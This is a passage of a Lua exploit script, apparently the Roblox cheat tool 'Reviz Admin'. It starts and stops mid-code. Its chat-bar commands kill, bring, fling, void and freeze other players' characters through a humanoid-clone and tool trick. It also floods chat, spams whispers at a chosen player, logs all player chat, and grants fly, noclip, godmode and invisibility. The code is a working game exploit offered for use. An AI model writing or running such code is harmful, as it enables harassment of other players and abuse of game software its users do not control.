		Text = "Game ID: ".. game.GameId;
		})
	end
	if string.sub(msg, 1, 4) == (prefix.."pgs") then
		local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
		if pgscheck == true then
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "PGSPhysicsSolverEnabled";
			Text = "PGS is Enabled!";
			})
		else
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "PGSPhysicsSolverEnabled";
			Text = "PGS is Disabled!";
			})
		end
	end
	if string.sub(msg, 1, 12) == (prefix.."removeinvis") then
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			if v:IsA("Part") then
				if v.Transparency == 1 then
					if v.Name ~= "HumanoidRootPart" then
						v:Destroy()
					end
				end
			end
		end
	end
	if string.sub(msg, 1, 10) == (prefix.."removefog") then
		game:GetService("Lighting").FogStart = 0
		game:GetService("Lighting").FogEnd = 9999999999999
	end
	if string.sub(msg, 1, 8) == (prefix.."disable") then
		lplayer.Character.Humanoid.Parent = lplayer
	end
	if string.sub(msg, 1, 7) == (prefix.."enable") then
		lplayer.Humanoid.Parent = lplayer.Character
	end
	if string.sub(msg, 1, 8) == (prefix.."prefix ") then
		prefix = (string.sub(msg, 9, 9))
		wait(0.1)
		change()
		wait(0.1)
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Prefix changed!";
		Text = "Prefix is now "..prefix..". Use ;resetprefix to reset to ;";
		})
	end
	if string.sub(msg, 1, 12) == (";resetprefix") then
		prefix = ";"
		wait(0.1)
		change()
		wait(0.1)
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Prefix changed!";
		Text = "Prefix is now "..prefix..". Make sure it's one key!";
		})
	end
	if string.sub(msg, 1, 10) == (prefix.."flyspeed ") then
		speedfly = string.sub(msg, 11)
		wait()
		change()
	end
	if string.sub(msg, 1, 8) == (prefix.."carpet ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
			local Anim3 = Instance.new("Animation")
			Anim3.AnimationId = "rbxassetid://282574440"
			local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
			track3:Play(.1, 1, 1)
			bplrr = v.Name
			banpl = true
		end
	end
	if string.sub(msg, 1, 9) == (prefix.."uncarpet") then
		banpl = false
	end
	if string.sub(msg, 1, 7) == (prefix.."stare ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
			staring = true
			stareplr = v
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."unstare") then
		staring = false
	end
	if string.sub(msg, 1, 8) == (prefix.."logchat") then
		chatlogs = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "LogChat enabled";
		Text = "Now logging all player chat.";
		})
	end
	if string.sub(msg, 1, 10) == (prefix.."unlogchat") then
		chatlogs = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "LogChat disabled";
		Text = "Stopped logging all player chat.";
		})
	end
	if string.sub(msg, 1, 7) == (prefix.."fixcam") then
		game:GetService("Workspace").CurrentCamera:Destroy()
		wait(0.1)
		game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
		game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
		lplayer.CameraMinZoomDistance = 0.5
		lplayer.CameraMaxZoomDistance = 400
		lplayer.CameraMode = "Classic"
	end
	if string.sub(msg, 1, 8) == (prefix.."unstate") then
		changingstate = false
	end
end)

local function tp()
	for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			if player.Name == brplr then
				player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 2
			end
		end
	end
end
local function tpall()
	for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 3
		end
	end
end
spawn(function()
	while wait(spamdelay) do
		if spamming == true then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamtext, "All")
		end
	end
end)
spawn(function()
	while wait(spamdelay) do
		if spammingpm == true then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..pmspammed.." @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "All")
		end
	end
end)
spawn(function()
	while wait() do
		if cbring == true then
			tp()
		end
	end
end)
spawn(function()
	while wait() do
		if cbringall == true then
			tpall()
		end
	end
end)

Mouse.KeyDown:connect(function(Key)
	if Key == prefix then
		CMDBAR:CaptureFocus()
	end
end)

CMDBAR.FocusLost:connect(function(enterPressed)
	if enterPressed then
		if string.sub(CMDBAR.Text, 1, 5) == ("kill ") then
			if string.sub(CMDBAR.Text, 6) == "me" then
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
			else
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6)))do
					local NOW = lplayer.Character.HumanoidRootPart.CFrame
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					lplayer.Character.Humanoid:EquipTool(v)
					end
					local function tp(player,player2)
					local char1,char2=player.Character,player2.Character
					if char1 and char2 then
					char1:MoveTo(char2.Head.Position)
					end
					end
					wait(0.1)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.2)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.5)
					lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
					wait(0.7)
					tp(lplayer,game:GetService("Players")[v.Name])
					wait(0.7)
					lplayer.Character.HumanoidRootPart.CFrame = NOW
					game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools needed!";
					Text = "You need a tool in your backpack for this command!";
					})
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("bring ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
				local NOW = lplayer.Character.HumanoidRootPart.CFrame
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
				lplayer.Character.Humanoid:EquipTool(v)
				end
				local function tp(player,player2)
				local char1,char2=player.Character,player2.Character
				if char1 and char2 then
				char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
				end
				end
				local function getout(player,player2)
				local char1,char2=player.Character,player2.Character
				if char1 and char2 then
				char1:MoveTo(char2.Head.Position)
				end
				end
				tp(game:GetService("Players")[v.Name], lplayer)
				wait(0.2)
				tp(game:GetService("Players")[v.Name], lplayer)
				wait(0.5)
				lplayer.Character.HumanoidRootPart.CFrame = NOW
				wait(0.5)
				getout(lplayer, game:GetService("Players")[v.Name])
				wait(0.3)
				lplayer.Character.HumanoidRootPart.CFrame = NOW
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools needed!";
				Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("spin ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
				lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				spinplr = v
				wait(0.5)
				spin = true
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools needed!";
				Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("unspin") then
			spin = false
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("attach ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
				lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				wait(0.3)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				attplr = v
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools needed!";
				Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("unattach ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
				local function getout(player,player2)
				local char1,char2=player.Character,player2.Character
				if char1 and char2 then
				char1:MoveTo(char2.Head.Position)
				end
				end
				getout(lplayer, game:GetService("Players")[v.Name])
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("follow ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
				followed = true
				flwplr = v
			end
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("unfollow") then
			followed = false
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("freefall ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
				local NOW = lplayer.Character.HumanoidRootPart.CFrame
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
				lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.6)
				lplayer.Character.HumanoidRootPart.CFrame = NOW
				wait(0.6)
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools needed!";
				Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("trail ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
				traill = true
				trlplr = v
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("untrail") then
			traill = false
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("orbit ") then
			if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
				lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
			else
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
					local o = Instance.new("RocketPropulsion")
					o.Parent = lplayer.Character.HumanoidRootPart
					o.Name = "Orbit"
					o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
					o:Fire()
					noclip = true
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("unorbit") then
			lplayer.Character.HumanoidRootPart.Orbit:Destroy()
			noclip = false
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("fling ") then
			if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
				lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
			else
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
					local y = Instance.new("RocketPropulsion")
					y.Parent = lplayer.Character.HumanoidRootPart
					y.CartoonFactor = 1
					y.MaxThrust = 800000
					y.MaxSpeed = 1000
					y.ThrustP = 200000
					y.Name = "Fling"
					game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
					y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
					y:Fire()
					noclip = true
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("unfling") then
			noclip = false
			lplayer.Character.HumanoidRootPart.Fling:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
			wait(0.4)
			lplayer.Character.HumanoidRootPart.Fling:Destroy()
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("fecheck") then
			if game:GetService("Workspace").FilteringEnabled == true then
				warn("FE is Enabled (Filtering Enabled)")
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "FE is Enabled";
					Text = "Filtering Enabled. Enjoy using Reviz Admin!";
				})
			else
				warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "FE is Disabled";
					Text = "Filtering Disabled. Consider using a different admin script.";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("void ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
				lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.6)
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools needed!";
				Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("noclip") then
			noclip = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Noclip enabled";
			Text = "Type ;clip to disable";
			})
		end
		if string.sub(CMDBAR.Text, 1, 4) == ("clip") then
			noclip = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Noclip disabled";
			Text = "Type ;noclip to enable";
			})
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("speed ") then
			lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 7))
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("ws ") then
			lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 4))
		end
		if string.sub(CMDBAR.Text, 1, 10) == ("hipheight ") then
			lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 11))
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("hh ") then
			lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 4))
		end
		if string.sub(CMDBAR.Text, 1, 10) == ("jumppower ") then
			lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 11))
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("jp ") then
			lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 4))
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("default") then
			lplayer.Character.Humanoid.JumpPower = 50
			lplayer.Character.Humanoid.WalkSpeed = 16
			lplayer.Character.Humanoid.HipHeight = 0
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("annoy ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
				annoying = true
				annplr = v
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("unannoy") then
			annoying = false
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("headwalk ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
				hwalk = true
				hdwplr = v
			end
		end
		if string.sub(CMDBAR.Text, 1, 10) == ("unheadwalk") then
			hwalk = false
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("nolimbs") then
			lplayer.Character["Left Leg"]:Destroy()
			lplayer.Character["Left Arm"]:Destroy()
			lplayer.Character["Right Leg"]:Destroy()
			lplayer.Character["Right Arm"]:Destroy()
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("god") then
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "FE Godmode enabled";
			Text = "Use ;grespawn or ;respawn to remove.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("drophats") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					v.Parent = workspace
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("droptool") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Tool")) then
					v.Parent = workspace
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("loopdhats") then
			droppinghats = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Loop Drop Enabled";
			Text = "Type ;unloopdhats to disable";
			})
		end
		if string.sub(CMDBAR.Text, 1, 11) == ("unloopdhats") then
			droppinghats = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Loop Drop Disabled";
			Text = "Type ;loopdhats to enable.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("loopdtool") then
			droppingtools = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Loop Drop Enabled";
			Text = "Type ;unloopdtool to disable";
			})
		end
		if string.sub(CMDBAR.Text, 1, 11) == ("unloopdtool") then
			droppingtools = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Loop Drop Disabled";
			Text = "Type ;loopdtool to enable.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("invisible") then -- Credit to Timeless
			Local = game:GetService('Players').LocalPlayer
			Char  = Local.Character
			touched,tpdback = false, false
			box = Instance.new('Part',workspace)
			box.Anchored = true
			box.CanCollide = true
			box.Size = Vector3.new(10,1,10)
			box.Position = Vector3.new(0,10000,0)
			box.Touched:connect(function(part)
			    if (part.Parent.Name == Local.Name) then
			        if touched == false then
			            touched = true
			            function apply()
			                if script.Disabled ~= true then
			                    no = Char.HumanoidRootPart:Clone()
			                    wait(.25)
			                    Char.HumanoidRootPart:Destroy()
			                    no.Parent = Char
			                    Char:MoveTo(loc)
			                    touched = false
			                end end
			            if Char then
			                apply()
			            end
			        end
			    end
			end)
			repeat wait() until Char
			loc = Char.HumanoidRootPart.Position
			Char:MoveTo(box.Position + Vector3.new(0,.5,0))
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Invisibility enabled!";
			Text = "Reset or use ;respawn to remove.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("view ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
				if game:GetService("Players")[v.Name].Character.Humanoid then
					game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
				else
					game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("unview") then
			if lplayer.Character.Humanoid then
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
			else
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
			end
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("goto ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			end
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("fly") then
		repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
		repeat wait() until Mouse
		
		local T = lplayer.Character.HumanoidRootPart
		local CONTROL = {F = 0, B = 0, L = 0, R = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
		local SPEED = speedget
		
		local function fly()
			flying = true
			local BG = Instance.new('BodyGyro', T)
			local BV = Instance.new('BodyVelocity', T)
			BG.P = 9e4
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0.1, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
			spawn(function()
			repeat wait()
			lplayer.Character.Humanoid.PlatformStand = true
			if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
			SPEED = 50
			elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
			SPEED = 0
			end
			if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
			BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
			lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
			elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
			BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
			else
			BV.velocity = Vector3.new(0, 0.1, 0)
			end
			BG.cframe = workspace.CurrentCamera.CoordinateFrame
					until not flying
					CONTROL = {F = 0, B = 0, L = 0, R = 0}
					lCONTROL = {F = 0, B = 0, L = 0, R = 0}
					SPEED = 0
					BG:destroy()
					BV:destroy()
					lplayer.Character.Humanoid.PlatformStand = false
				end)
			end
		Mouse.KeyDown:connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = speedfly
			elseif KEY:lower() == 's' then
				CONTROL.B = -speedfly
			elseif KEY:lower() == 'a' then
				CONTROL.L = -speedfly 
			elseif KEY:lower() == 'd' then 
				CONTROL.R = speedfly
			end
		end)
		Mouse.KeyUp:connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = 0
			elseif KEY:lower() == 's' then
				CONTROL.B = 0
			elseif KEY:lower() == 'a' then
				CONTROL.L = 0
			elseif KEY:lower() == 'd' then
				CONTROL.R = 0
			end
		end)
		fly()
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("unfly") then
			flying = false
			lplayer.Character.Humanoid.PlatformStand = false
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("chat ") then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(CMDBAR.Text, 6)), "All")
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("spam ") then
			spamtext = (string.sub(CMDBAR.Text, 6))
			spamming = true
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("unspam") then
			spamming = false
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("spamwait ") then
			spamdelay = (string.sub(CMDBAR.Text, 10))
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("pmspam ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
				pmspammed = v.Name
				spammingpm = true
			end
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("unpmspam") then
			spammingpm = false
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("cfreeze ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 9))) do
				v.Character["Left Leg"].Anchored = true
				v.Character["Left Arm"].Anchored = true
				v.Character["Right Leg"].Anchored = true
				v.Character["Right Arm"].Anchored = true
				v.Character.Torso.Anchored = true
				v.Character.Head.Anchored = true
			end
		end
		if string.sub(CMDBAR.Text, 1, 10) == ("uncfreeze ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 11))) do
				v.Character["Left Leg"].Anchored = false
				v.Character["Left Arm"].Anchored = false
				v.Character["Right Leg"].Anchored = false
				v.Character["Right Arm"].Anchored = false
				v.Character.Torso.Anchored = false
				v.Character.Head.Anchored = false
			end
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("unlockws") then
			local a = game:GetService("Workspace"):getChildren()
			for i = 1, #a do
				if a[i].className == "Part" then
					a[i].Locked = false
				elseif a[i].className == "Model" then
					local r = a[i]:getChildren()
					for i = 1, #r do
						if r[i].className == "Part" then
						r[i].Locked = false
						end
					end
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Success!";
			Text = "Workspace unlocked. Use ;lockws to lock.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("lockws") then
			local a = game:GetService("Workspace"):getChildren()
			for i = 1, #a do
				if a[i].className == "Part" then
					a[i].Locked = true
				elseif a[i].className == "Model" then
					local r = a[i]:getChildren()
					for i = 1, #r do
						if r[i].className == "Part" then
						r[i].Locked = true
						end
					end
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("btools") then
			local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
			Clone_T.BinType = "Clone"
			local Destruct = Instance.new("HopperBin",lplayer.Backpack)
			Destruct.BinType = "Hammer"
			local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
			Hold_T.BinType = "Grab"
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("pstand") then
			lplayer.Character.Humanoid.PlatformStand = true
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("unpstand") then
			lplayer.Character.Humanoid.PlatformStand = false
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("blockhead") then
			lplayer.Character.Head.Mesh:Destroy()
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("sit") then
			lplayer.Character.Humanoid.Sit = true
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("bringobj ") then
			local function bringobjw()
			for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
			if obj.Name == (string.sub(CMDBAR.Text, 10)) then
			obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
			obj.CanCollide = false
			obj.Transparency = 0.7
			wait()
			obj.CFrame = lplayer.Character["Left Leg"].CFrame
			wait()
			obj.CFrame = lplayer.Character["Right Leg"].CFrame
			wait()
			obj.CFrame = lplayer.Character["Head"].CFrame
			end
			end
			end
			while wait() do
				bringobjw()
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "BringObj";
			Text = "BringObj enabled.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("wsvis ") then
			vis = (string.sub(CMDBAR.Text, 7))
			local a = game:GetService("Workspace"):GetDescendants()
			for i = 1, #a do
				if a[i].className == "Part" then
					a[i].Transparency = vis
				elseif a[i].className == "Model" then
					local r = a[i]:getChildren()
					for i = 1, #r do
						if r[i].className == "Part" then
